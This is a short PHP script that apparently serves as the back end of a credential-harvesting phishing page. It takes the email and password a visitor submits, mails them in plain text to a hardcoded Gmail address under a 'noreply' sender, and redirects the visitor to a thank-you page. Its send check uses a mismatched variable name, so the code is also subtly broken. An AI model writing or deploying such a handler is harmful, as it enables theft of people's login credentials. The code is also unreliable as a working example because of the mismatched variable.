<?php

//get data from form 

$Email= $_POST['Email'];

$Password= $_POST['Password'];

$to = "aliyansaleem2004@gmail.com";

$subject = "Mail From website";

$txt ="Email = " . $Email . "\r\n Password =" . $Password;

$headers = "From: noreply@codeconia.com" . "\r\n" .

"CC: somebodyelse@example.com";

if($email!=NULL){

mail($to,$subject,$txt,$headers);

}

//redirect

header("Location:thankyou.html");

?>

